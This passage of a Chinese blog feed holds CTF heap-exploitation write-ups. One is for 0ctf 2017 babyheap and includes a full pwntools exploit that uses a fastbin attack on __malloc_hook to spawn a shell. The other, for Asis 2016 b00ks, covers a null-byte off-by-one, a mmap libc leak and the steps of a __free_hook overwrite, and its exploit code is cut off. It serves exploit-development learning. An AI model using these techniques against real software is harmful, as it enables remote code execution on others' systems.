class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下一个chunk的大小</span></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="comment">// next chunk size valid check</span></span><br><span class="line"><span class="comment">// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者</span></span><br><span class="line"><span class="comment">// nextsize是否大于系统可提供的内存</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">    __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将chunk1释放，并重新分配一个大小0x60的chunk，这里chunk1被取回并成功扩大。</p></li><li>因为使用的calloc会初始化内存，所以还需要恢复一下chunk2的前20个字节</li><li>释放chunk2，chunk2进入small bin</li><li>打印chunk1，泄露出libc的基址</li><li>通过libc基址计算出malloc_hook的地址和one_gadget的地址</li><li>释放掉chunk1，通过溢出chunk0来修改chunk1的fd，将fd修改到malloc_hook附近</li><li>通过两次分配，得到malloc_hook附近的chunk</li><li>向malloc_hook中写入one_gadget，成功getshell</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./0ctfbabyheap'</span>)</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(index, content)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">        p.sendline(<span class="string">'2'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">        p.sendline(str(index))</span><br><span class="line">        p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">        p.sendline(str(len(content) + <span class="number">1</span>))</span><br><span class="line">        p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">        p.sendline(<span class="string">'3'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">        p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span><span class="params">(index)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">        p.sendline(<span class="string">'4'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">        p.sendline(str(index))</span><br><span class="line">        p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">        data = p.recvline()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">        Allocate(<span class="number">0x60</span>)<span class="comment">#0</span></span><br><span class="line">        Allocate(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从chunk0溢出，将chunk1的size改为0x71，使chunk1覆盖范围更大</span></span><br><span class="line">        payload = <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">        Fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#分配一个0x100的smallchunk 再分配一个chunk是为了防止free smallchunk时被topchunk合并</span></span><br><span class="line"><span class="comment">#该smallchunk的chunkhead(0x10个字节)和fd、bk(0x10个字节)都在修改后的chunk1的数据区</span></span><br><span class="line"><span class="comment">#接下来要将chunk1释放掉再分配使chunk1范围真正扩大 </span></span><br><span class="line"><span class="comment">#但释放时会检查下一个chunk的size是否大于2*size_sz且小于system_mem</span></span><br><span class="line"><span class="comment">#所以还得构造一下next size</span></span><br><span class="line">        Allocate(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">        Allocate(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">        payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">        Fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#释放chunk1并重新分配回来，因为alloc会初始化内存，所以smallchunk的前0x20个字节被清空</span></span><br><span class="line"><span class="comment">#恢复smallchunk的前0x20个字节</span></span><br><span class="line">        Free(<span class="number">1</span>)</span><br><span class="line">        Allocate(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">        payload = <span class="string">'a'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">        Fill(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#释放smallchunk 因为当smallbin是一个双向链表 所以当其中只有一个chunk时</span></span><br><span class="line"><span class="comment">#该chunk的fd和bk都指向头结点 头结点存在于main_arena中 main_arena又存在于libc中</span></span><br><span class="line"><span class="comment">#所以fd和bk指向的是libc中的某个地址 通过固定的偏移 则可以泄露出libc_base</span></span><br><span class="line">        Free(<span class="number">2</span>)</span><br><span class="line">        leaked = u64(Dump(<span class="number">1</span>)[<span class="number">-9</span>:<span class="number">-1</span>]) - <span class="number">0x3C27B8</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"libc_base : %#x"</span> % (leaked) </span><br><span class="line">        <span class="keyword">return</span> leaked</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastbin_attack</span><span class="params">(libc_base)</span>:</span></span><br><span class="line"><span class="comment">#malloc_hook 可以在gdb中 x/32gx (long long)(&amp;main_arena)-0x40 来找到</span></span><br><span class="line">        malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="comment">#使用 one_gadget 找到execve('/bin/sh')</span></span><br><span class="line">        execve_addr = libc_base + <span class="number">0x4647c</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"malloc_hook : %#x"</span> % malloc_hook</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"execve_addr : %#x"</span> % execve_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#释放掉chunk1 通过溢出chunk0来修改chunk1的fd</span></span><br><span class="line"><span class="comment">#通过控制chunk1的fd 则可以在任何地方分配内存 那么我们可以控制malloc_hook</span></span><br><span class="line"><span class="comment">#因为malloc会检查fastbin中chunk的size是否属于这个fastbin</span></span><br><span class="line"><span class="comment">#而malloc_hook处的值为0 不能通过检查</span></span><br><span class="line"><span class="comment">#通过前文提到的未对齐的数据来绕过检查</span></span><br><span class="line"><span class="comment">#这样就可以获得一个size位为0x7f的chunk</span></span><br><span class="line">        Free(<span class="number">1</span>)</span><br><span class="line">        payload = <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">19</span>) + p64(<span class="number">0</span>)</span><br><span class="line">        Fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过两次分配 得到malloc_hook附近的chunk</span></span><br><span class="line">        Allocate(<span class="number">0x60</span>)</span><br><span class="line">        Allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖一定的无效数据到达malloc_hook的地址 向其中写入execve_addr</span></span><br><span class="line">        payload = p8(<span class="number">0</span>)*<span class="number">3</span>  + p64(execve_addr)</span><br><span class="line">        Fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc时判断malloc_hook不为0 执行malloc_hook指向的代码 getshell</span></span><br><span class="line">        Allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">libc_base = leak_libc()</span><br><span class="line">fastbin_attack(libc_base)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/fastbinAtk/0ctf2017_babyheap/0ctfbabyheap" target="_blank" rel="noopener">0ctf_babyheap</a><br>writeup参考：<a href="https://blog.csdn.net/qq_29343201/article/details/66476135" target="_blank" rel="noopener">Anciety师傅的博客</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> writeup </tag>
            
            <tag> ctfwiki </tag>
            
            <tag> how2heap </tag>
            
            <tag> fastbin_attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Asis2016-b00ks writeup</title>
      <link href="/post/b6745c59.html"/>
      <url>/post/b6745c59.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：Asis CTF 2016<br>知识点：null byte off_by_one、mmap泄露libc基址<br>题目是一个书籍管理系统，具有增删查改功能。<br><a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/pwn_learn/heapLearn/off_by_one$ ./b00ks </span><br><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name: aaaa</span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>题目是64位程序，开启保护情况：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p></p><p>程序<strong>开启了PIE</strong>，意味着难以得到程序中函数的地址，可能对泄露libc造成阻碍。</p><h2 id="程序概况"><a href="#程序概况" class="headerlink" title="程序概况"></a>程序概况</h2><p>程序首先要求输入author name，调用一个处理输入的函数（input函数）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">input</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>分析代码可以发现，代码对字符串末尾处理不当，会在字符串的最后加上<code>&#39;\x00&#39;</code>,即使字符串已经占满buf。也就是说程序中存在<strong>null byte off_by_one漏洞</strong></p><p><strong>create函数:</strong><br>输入name，对大小没有限制<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"\nEnter book name size: "</span>, *&amp;v1);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter book name (Max 32 chars): "</span>, &amp;v1);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p></p><p>输入description，同样对大小无限制<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"\nEnter book description size: "</span>, *&amp;v1);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v5 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter book description: "</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( input(v5, v1 - <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Unable to read description"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p></p><p>最后将name和description的指针存入结构体<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">    *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">    *(off_202010 + v2) = v3;</span><br><span class="line">    *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">    *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">    *v3 = ++cnt;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>分析可得到结构体<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000 book            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 index           dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 description     dq ?</span><br><span class="line">00000018 size            dq ?</span><br><span class="line">00000020 book            ends</span><br></pre></td></tr></table></figure><p></p><p><strong>delete函数</strong>会将指针清零，不存在悬挂指针<br><strong>edit函数</strong>用于编辑book的description<br><strong>print函数</strong>输出ID、name、description、author，可以用来泄露信息<br><strong>change_name函数</strong>可以修改author name</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h3><p>由于null byte off_by_one，在程序开头时，若输入32位的author name（unk_202040），那么<code>&#39;\x00&#39;</code>会溢出到book_list（unk_202060）中<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202010 book_list       dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o</span><br><span class="line">.data:0000000000202010                                         ; delete:loc_C1B↑o ...</span><br><span class="line">.data:0000000000202018 author_name     dq offset unk_202040    ; DATA XREF: change_name+15↑o</span><br><span class="line">.data:0000000000202018                                         ; print+CA↑o</span><br></pre></td></tr></table></figure><p></p><p>若是此时create一个book，那么新book的指针将会覆盖掉这个溢出的<code>&#39;\x00&#39;</code>，导致author name与book指针之间没有截断，意味着我可以通过输出author name来泄露出book的指针，也就是堆地址。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x555555756040:0x61616161616161610x6161616161616161 &lt;== author name</span><br><span class="line">0x555555756050:0x61616161616161610x0061616161616161</span><br><span class="line">0x555555756060:0x0000555555757160&lt;== book指针</span><br></pre></td></tr></table></figure><p></p><p>由于程序提供修改author name的函数，所以可以再次输入32位的author name，使溢出的<code>&#39;\x00&#39;</code>覆盖掉book指针的最低字节，导致book的指针所指向的<strong>地址变小</strong>。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000555555757160 ==&gt; 0x0000555555757100 //地址变小</span><br></pre></td></tr></table></figure><p></p><p>因为在create一个book时，会先申请name和description的空间，所以经过修改的book指针有可能就会<strong>指向地址偏小description的空间</strong>中<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x555555757000:0x00000000000000000x0000000000000021 &lt;== name</span><br><span class="line">0x555555757010:0x61616161616161610x0000000000000000</span><br><span class="line">0x555555757020:0x00000000000000000x0000000000000131 &lt;== description</span><br><span class="line">0x555555757030:0x62626262626262620x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">                                ......</span><br><span class="line">0x555555757100:0x00000000000000000x0000000000000000 &lt;== 修改后的book指针，指向description中</span><br><span class="line">                                ...... </span><br><span class="line">0x555555757150:0x00000000000000000x0000000000000031</span><br><span class="line">0x555555757160:0x00000000000000010x0000555555757010 &lt;== 修改前的book指针</span><br><span class="line">0x555555757170:0x00005555557570300x0000000000000120</span><br><span class="line">0x555555757180:0x00000000000000000x0000000000020e81</span><br></pre></td></tr></table></figure><p></p><p>所以可以事先在description中<strong>伪造一个book结构体</strong>，当book指针被修改于此时，就可以对伪造的name和description进行读写，<strong>实现任意读写</strong>。</p><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>这道题由于开启PIE，并且没有uaf等常规方法来泄露libc，所以这里采用了一种更为巧妙的方法。在分配第二个book时，申请一个很大的空间，使堆以mmap模式进行拓展（可以参考<a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="noopener">这里</a>）。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x56052bb62000     0x56052bb64000 r-xp     2000 0      /home/nick/pwn_learn/heapLearn/off_by_one/b00ks</span><br><span class="line">    0x56052bd63000     0x56052bd64000 r--p     1000 1000   /home/nick/pwn_learn/heapLearn/off_by_one/b00ks</span><br><span class="line">    0x56052bd64000     0x56052bd65000 rw-p     1000 2000   /home/nick/pwn_learn/heapLearn/off_by_one/b00ks</span><br><span class="line">    0x56052d944000     0x56052d965000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7fd6affa0000     0x7fd6b015e000 r-xp   1be000 0      /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">    0x7fd6b015e000     0x7fd6b035e000 ---p   200000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">    0x7fd6b035e000     0x7fd6b0362000 r--p     4000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">    0x7fd6b0362000     0x7fd6b0364000 rw-p     2000 1c2000 /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">    0x7fd6b0364000     0x7fd6b0369000 rw-p     5000 0      </span><br><span class="line">    0x7fd6b0369000     0x7fd6b038c000 r-xp    23000 0      /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span class="line">    0x7fd6b054d000     0x7fd6b0572000 rw-p    25000 0      &lt;==== mmap分配的空间</span><br><span class="line">    0x7fd6b058a000     0x7fd6b058b000 rw-p     1000 0      </span><br><span class="line">    0x7fd6b058b000     0x7fd6b058c000 r--p     1000 22000  /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span class="line">    0x7fd6b058c000     0x7fd6b058d000 rw-p     1000 23000  /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span class="line">    0x7fd6b058d000     0x7fd6b058e000 rw-p     1000 0      </span><br><span class="line">    0x7ffe6b361000     0x7ffe6b382000 rw-p    21000 0      [stack]</span><br><span class="line">    0x7ffe6b3bd000     0x7ffe6b3bf000 r--p     2000 0      [vvar]</span><br><span class="line">    0x7ffe6b3bf000     0x7ffe6b3c1000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><p></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>因为PIE，所以很难采用覆写got表等方法。而已经泄露了libc，所以这里采用向__free_hook写入system来getshell</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>输入32位的author name，create一个book1（name：0x20字节，description：0x120字节）</li><li>调用show函数 <strong>泄露堆地址</strong></li><li>create book2（description为大空间：0x21000字节），<strong>准备泄露libc基址</strong></li><li>create book3（name写入<code>&#39;/bin/sh\x00&#39;</code>）为getshell做准备</li><li>在book1-&gt;description中伪造book结构体，name指针为book2的description指针（<strong>即mmap分配空间的地址</strong>），description指针为<strong>book3中description指针的地址</strong>。（这里地址都可以由泄露的堆地址加上偏移得到）</li><li>重新向author name中写入32个字节，使<code>&#39;\x00&#39;</code>覆盖掉book1指针的最低位字节，book1指针指向book1-&gt;description中布置好的book结构体</li><li>调用show函数，通过book1的name的值得到mmap分配的地址，减去固定的偏移<strong>获得libc基址</strong></li><li>通过libc基址，计算出system和__free_hook的地址</li><li>调用edit，修改book1的description，写入<strong>free_hook的地址，因为第（5）步，所以这里实际是将book3的description指针改为</strong>free_hook的地址</li><li>调用edit，修改book3的description，写入system，因为第（9）步，所以这里实际是把system写入__free_hook中</li><li>调用delete(book3)，因为事先在name写入的<code>&#39;/bin/sh\x00&#39;</code>，所以成功getshell</li></ol><h2 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 